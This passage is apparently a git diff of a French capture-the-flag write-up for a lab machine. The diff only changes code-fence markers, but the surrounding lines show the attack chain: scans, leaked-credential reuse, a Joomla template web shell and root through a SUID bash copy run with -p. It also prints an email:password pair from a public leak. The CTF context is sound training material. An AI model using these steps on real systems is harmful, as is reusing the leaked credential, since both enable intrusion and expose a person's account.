@@ -12,13 +12,13 @@ Un scan détaillé (*nmap -T5 -p 22,80,139,445,2003 -A -sC -sV -oA scan 10.1.1.2
 
 Il y a aussi le port 10000 qui fait tourner un autre serveur web :  
 
-```plain
+```
 Apache httpd 2.4.29 ((Ubuntu))
 ```
 
 Pour terminer, le script d'exploration web de Nmap remonte deux adresses emails :  
 
-```plain
+```
 | http-grep:
 |   (2) http://10.1.1.23:80/:
 |     (2) email:
@@ -31,7 +31,7 @@ Troll des champs
 
 J'ai lancé un *Joomscan* sur le port 10000 puisqu'il fait tourner... Joomla (élémentaire mon cher *Watson* !)  
 
-```plain
+```
     ____  _____  _____  __  __  ___   ___    __    _  _
    (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
   .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
@@ -157,7 +157,7 @@ Ensuite viens la tache fastidieuse de déterminer si l'un des plugins est vulné
 
 J'ai ensuite lancé Wapiti avec les modules Nikto et buster histoire de trouver des fichiers ou dossiers intéressants :  
 
-```plain
+```
 $ ./bin/wapiti -u http://10.1.1.23:10000/ -m "buster,nikto"
 
      __    __            _ _   _ _____
@@ -276,7 +276,7 @@ It's all about OSINT you fool!
 
 Si on recherche l'adresse email remontée par Nmap via Google on trouve [ce leak](https://pastebin.pl/view/f1b64ad3) avec les creds suivants :  
 
-```plain
+```
 hometowncebu@gmail.com:cabergas08
 ```
 
@@ -326,7 +326,7 @@ with open(passfile, errors="ignore") as fdpass:
 
 On met ensuite des versions possibles du nom d'utilisateur dans un fichier et le pass dans un autre :  
 
-```plain
+```
 $ python3 brute.py /tmp/users.txt /tmp/passwords.txt
 Testing password cabergas08
 Got no error and status code 200 with cebu / cabergas08
@@ -338,7 +338,7 @@ L'étape suivante est de modifier un script PHP du template Joomla via *control 
 
 On obtient facilement un shell en tant que *www-data* et via la réutilisation du mot de passe l'accès au compte *cebu* (et le premier flag).  
 
-```plain
+```
 www-data@rosee:/var$ su cebu
 Password:
 cebu@rosee:/var$ id
@@ -347,7 +347,7 @@ uid=1000(cebu) gid=1000(cebu) groups=1000(cebu),4(adm),24(cdrom),30(dip),46(plug
 
 Ni une ni deux :  
 
-```plain
+```
 cebu@rosee:/var$ sudo -l
 [sudo] password for cebu:
 Matching Defaults entries for cebu on rosee:
@@ -367,7 +367,7 @@ I read your mails
 
 Il y a un autre chemin vers root, plus intéressant :  
 
-```plain
+```
 cebu@rosee:~$ cat /var/spool/mail/cebu
 From: CEO <ceo@localhost>
 To: Cebu <cebu@localhost>
@@ -382,7 +382,7 @@ Greetings .
 
 Il y a en effet un binaire setuid :  
 
-```plain
+```
 [+] World-writable SUID files owned by root:
 -rwsrwxrwx 1 root root 1113504 Aug  9 15:26 /usr/bin/sudo.old
 ```
@@ -391,7 +391,7 @@ Comme vu sur un autre CTF toute tentative de modifier un binaire avec ce flag va
 
 Ce binaire ne semble pas donner de shell root... à première vue :  
 
-```plain
+```
 www-data@rosee:/var/www/admin/blog/templates/protostar$ sudo.old
 sudo.old-4.4$ id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -399,7 +399,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 C'est simplement parce que le binaire est une copie de bash et que ce programme droppe par défaut ses privilèges. Il suffit alors de l'appeler avec l'option -p :  
 
-```plain
+```
 www-data@rosee:/var/www/admin/blog/templates/protostar$ sudo.old -p
 sudo.old-4.4# id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
